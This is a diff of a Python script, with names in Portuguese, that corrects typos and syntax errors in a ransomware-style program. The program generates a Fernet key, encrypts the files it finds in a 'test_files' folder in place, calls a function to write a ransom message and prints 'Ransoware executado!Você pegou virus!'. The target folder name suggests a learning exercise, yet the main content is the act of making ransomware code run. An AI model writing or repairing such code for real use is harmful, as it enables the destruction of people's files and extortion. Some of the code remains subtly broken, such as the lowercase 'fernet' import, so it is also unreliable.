@@ -1,18 +1,19 @@
 from cryptography.fernet import fernet
+import os
 
 def gerar_chave():
-    chave = ferne.generate_key()
-    with open("chave.key", "wb") as chaves_file:
-        chaves_file.write(chave)
+    chave = fernet.generate_key()
+    with open("chave.key", "wb") as chave_file:
+        chave_file.write(chave)
 
 def carregar_chave():
-    return open("chave.key", "rb").(read)
+    return open("chave.key", "rb").read()
 
 def criptografar_arquivo(arquivo, chave):
     f = fernet(chave)
     with open(arquivo, "rb") as file:
         dados= file.read()
-    dados_encriptados = f.encrupt(dados)
+    dados_encriptados = f.encrypt(dados)
     with open(arquivo, "wb") as file:
         file.write(dados_encriptados)
 
@@ -34,12 +35,12 @@ def criar_mensagem_resgate():
         def main():
             gerar_chave()
             chave = carregar_chave()
-            arquivos = econtrar_arquivos("test_files")
+            arquivos = encontrar_arquivos("test_files")
             for arquivo in arquivos:
-            criptografar_arquivo(arquivo, chave)
+             criptografar_arquivo(arquivo, chave)
             criar_mensagem_resgate()
             print("Ransoware executado!Você pegou virus!")
 
-if _name_=="__main__"
-main()
+if __name__=="__main__":
+    main()
     
